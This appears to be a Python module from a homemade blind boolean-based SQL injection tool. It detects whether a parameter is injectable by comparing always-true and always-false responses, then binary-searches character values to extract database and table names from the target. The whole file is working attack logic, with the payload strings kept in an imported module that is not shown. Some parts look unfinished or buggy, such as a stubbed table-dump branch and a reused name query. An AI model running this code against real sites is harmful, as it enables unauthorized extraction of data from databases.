from HandleRequests import *
from STRINGS import *
import math


async def check_if_boolean_based_is_possible(request, parameter, comment, session):
    """
    check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
    comparing the results
    :param request: a HTTPRequest object whose data we will change and send
    :param parameter: the GET/POST parameter which is exploitable
    :param comment: the comment chars
    :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
    """
    boolean_false = await send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_FALSE % comment, session)
    boolean_true = await send_sql_request(request, parameter, BLIND_BOOLEAN_ALWAYS_TRUE % comment, session)
    reponse_true = await boolean_true.text()
    reponse_false = await boolean_false.text()
    if boolean_true != boolean_false:
        print(BOOLEAN_BSQLI_ENABLED)
        return reponse_false, reponse_true
    print(BOOLEAN_BSQLI_DISABLED)
    return NOT_DETECTED


async def ask_sql_with_boolean(request, parameter, query, session, true_and_false_responses):
    """

    :param request:
    :param parameter:
    :param query:
    :param session:
    :param true_and_false_responses:
    :return:
    """
    response = await send_sql_request(request, parameter, query, session)
    response_text = await response.text()
    if response_text != true_and_false_responses[BOOLEAN_FALSE_RESPONSE_INDEX]:
        return True
    return False


async def find_number(request, parameter, true_and_false_responses, query, limit, session):
    """
    returns a number, handles counting
    :param request: the HTTPRequest object we will modify
    :param parameter: the exploitable parameter
    :param comment: the comment char
    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
    :param query: the query we want to send to the sql server. should check something about a number, and use our index in every iteration
    :param limit: a high bound for the for loop
    :return: the number requested
    """
    for i in range(limit):
        response = await ask_sql_with_boolean(request, parameter, query % str(i), session, true_and_false_responses)
        if response:
            return i
    return NOT_DETECTED


async def find_letter_in_string(request, parameter, true_and_false_responses, query, session):
    """

    :param request:
    :param parameters:
    :param true_and_false_responses:
    :param query:
    :param session
    :return:
    """
    lower_bound = ASCII_LOWER_BOUND
    upper_bound = ASCII_UPPER_BOUND
    i = math.ceil((lower_bound + upper_bound) / 2)
    while upper_bound >= lower_bound:
        equal_reponse = await ask_sql_with_boolean(request, parameter, query % (EQUAL_SIGN, str(i)), session,
                                                   true_and_false_responses)
        if equal_reponse:
            # we checked only for upper, so if the letter is lowercase we need to also check
            if i <= ASCII_UPPER_CASE_UPPER_BOUND and i >= ASCII_UPPER_CASE_LOWER_BOUND:
                # meaning this is a letter
                upper_or_lower_query = query % (EQUAL_SIGN, str(i + FROM_UPPER_TO_LOWER))
                if UPPER_FUNCTION in upper_or_lower_query:
                    upper_or_lower_query = upper_or_lower_query.replace(UPPER, '')
                upper_or_lower_response = await ask_sql_with_boolean(request, parameter, upper_or_lower_query, session,
                                                                     true_and_false_responses)
                if upper_or_lower_response:
                    return chr(i + FROM_UPPER_TO_LOWER)
            return chr(i)
        lt_response = await ask_sql_with_boolean(request, parameter, query % (LT_SIGN, str(i)), session,
                                                 true_and_false_responses)
        if lt_response:
            upper_bound = i - 1
        else:
            lower_bound = i + 1
        i = math.ceil((lower_bound + upper_bound) / 2)
    return NOT_DETECTED


async def find_word(request, parameter, query, true_and_false_responses, session, word_length):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_responses:
    :return:
    """
    tasks = []
    for i in range(1, word_length + 1):
        tasks.append(
            asyncio.create_task(find_letter_in_string(request, parameter, true_and_false_responses,
                                                      query % (i, STRING_PLACEHOLDER, STRING_PLACEHOLDER), session)))
    ret = await asyncio.wait(tasks)
    word = ''.join([task.result() for task in tasks])
    return word


async def find_db_names(request, parameter, comment, true_and_false_responses, session):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_responses:
    :return:
    """
    num_of_dbs = await find_number(request, parameter, true_and_false_responses,
                                   BLIND_BOOLEAN_COUNT_DBS % (STRING_PLACEHOLDER, comment), MAX_NUM_OF_DBS_TO_CHECK,
                                   session)
    db_names = []
    for i in range(num_of_dbs):
        length_of_word = await find_number(request, parameter, true_and_false_responses,
                                           BLIND_BOOLEAN_DB_NAME_LENGTH % (i, STRING_PLACEHOLDER, comment),
                                           MAX_LEN_OF_STRING,
                                           session)
        db_name = await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_CHAR % (
            STRING_PLACEHOLDER, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
                                  true_and_false_responses, session,
                                  length_of_word)  # The query should be a single letter find query with an index placeholder
        db_names.append(db_name)
    return db_names


async def find_table_names(request, parameter, comment, true_and_false_responses, session, db_name):
    """

    :param request:
    :param parameter:
    :param comment:
    :param true_and_false_responses:
    :param session:
    :param db_name:
    :return:
    """
    # first, we will check that the db really exists
    does_db_exist = await ask_sql_with_boolean(request, parameter, BLIND_BOOLEAN_DB_NAME_EXISTS % (db_name, comment),
                                               session, true_and_false_responses)
    if not does_db_exist:
        print(DB_NOT_FOUND)
        exit(0)
    # find number of dbs
    num_of_tables = await find_number(request, parameter, true_and_false_responses,
                                      BLIND_BOOLEAN_COUNT_TABLES % (db_name, STRING_PLACEHOLDER, comment),
                                      MAX_NUM_OF_TABLES_TO_CHECK,
                                      session)
    table_names = []
    for i in range(num_of_tables):
        length_of_word = await find_number(request, parameter, true_and_false_responses,
                                           BLIND_BOOLEAN_TABLE_NAME_LENGTH % (db_name, i, STRING_PLACEHOLDER, comment),
                                           MAX_LEN_OF_STRING,
                                           session)
        table_name = await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_CHAR % (
            STRING_PLACEHOLDER, db_name, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
                                     true_and_false_responses, session,
                                     length_of_word)  # The query should be a single letter find query with an index placeholder
        table_names.append(table_name)
    return table_names


async def boolean_based_injection(request, parameter, comment, session, flags):
    """
    manages the boolean-based injection attempts
    :param request: the request we will modify
    :param parameter: the vulnerable parameter
    :param comment: the comment char
    :return: true if the injection worked
    """
    true_and_false_responses = await check_if_boolean_based_is_possible(request, parameter, comment, session)
    if true_and_false_responses != NOT_DETECTED:  # boolean is possible!
        action = flags.get_action()
        if action == FIND_DB_NAMES:
            db_names = await find_db_names(request, parameter, comment, true_and_false_responses, session)
            print(db_names)
        elif action == FIND_TABLE_NAMES:
            table_names = await find_table_names(request, parameter, comment, true_and_false_responses, session,
                                                 flags.get_db_name())
            print(table_names)
        elif action == DUMP_TABLE:
            a = 1
